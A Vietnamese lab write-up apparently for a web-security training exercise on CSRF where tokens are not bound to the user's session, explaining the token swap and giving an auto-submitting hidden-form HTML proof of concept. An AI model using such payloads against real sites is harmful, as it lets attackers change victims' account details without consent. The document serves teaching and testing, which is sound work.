# CSRF where token is not tied to user session

### Yêu cầu: Tạo thẻ HTML để tấn công CSRF thay đổi email của tài khoản người dùng

### Hướng làm: 

Ở đây chúng ta có 2 tài khoản có vai trò như nhau để sử dụng cho việc tấn công. 

Giả sử `wiener:peter` là nạn nhân còn `carlos:montoya` là người tấn công, ta sẽ làm thay đổi email của tài khoản `wiener`

Đầu tiên ta sẽ đăng nhập vào tài khoản của `wiener` để bắt request.

![image](https://user-images.githubusercontent.com/72268643/157742534-a4464213-4a4a-4f71-ae00-6004462b0162.png)

Ta có giá trị token của `wiener`: `csrf=hXBVHlrIzCODslGXhWvQ5KtuDCRo3ufO` `session=bYFS0HMMNhTuGYPq9cOV0bC6TFahfO05`

Làm tương tự (mở tab ẩn danh) ta có giá trị token của `carlos`: `csrf=hkPpWOi1GuUUFDboLPtAZj8EIugYx8RM`

Ở lab này, họ có nói là đôi khi trang web đó tạo ra rất nhiều các giá trị CSRF token nhưng lại không được gắn với session của người dùng đó. Tức là chỉ cần là 1 token trong những token hợp lệ thì chúng ta có thể thực hiện được hành vi mà chúng ta mong muốn.

Chẳng hạn như ta có thể dùng request ta bắt được của `wiener` nhưng sửa token thành token của `carlos` và thực hiện gửi request đó thì ta vẫn sẽ trả về là email đã được đổi ở trên tài khoản `wiener`

![image](https://user-images.githubusercontent.com/72268643/157743409-16f4bee8-d41e-497d-9abe-6383964374e6.png)

![image](https://user-images.githubusercontent.com/72268643/157743698-ebbd3a06-166d-490c-903c-7037a13b5011.png)

Vậy để thực hiện tấn công, ta sử dụng request thay đổi email của `wiener` và thay token thành token của `carlos` rồi thực hiện viết PoC từ request đó. 
```
<html>
  <body>
    <h1>Hello World</h1> <!-- Phần được hiển thị-->
    <iframe style="display:none;" name="csrf-iframe"></iframe> <!-- Để ẩn thẻ form khi hiển thị tới nạn nhân -->
    <form action="nơi_khai_thác_CSRF_ở_trên_trang_web_đó" method="POST" id="csrf-form">
      <input type="hidden" name="email" value="email_mà_bạn_muốn_đổi">
      <input type="hidden" name="csrf" value="token_của_người_tấn_công" />
    </form>

    <script>document.getElementById("csrf-form").submit()</script> <!-- Phần tự submit form thực thi -->
  </body>
</html>
```

LƯU Ý: Sau mỗi lần gửi thì token của `carlos` sẽ được làm mới. Vậy nên khi thực hiện viết PoC, ta cần lấy token mới sau khi reload

Cuối cùng thì gửi lên Server và gửi đến cho nạn nhân để hoàn thành lab.
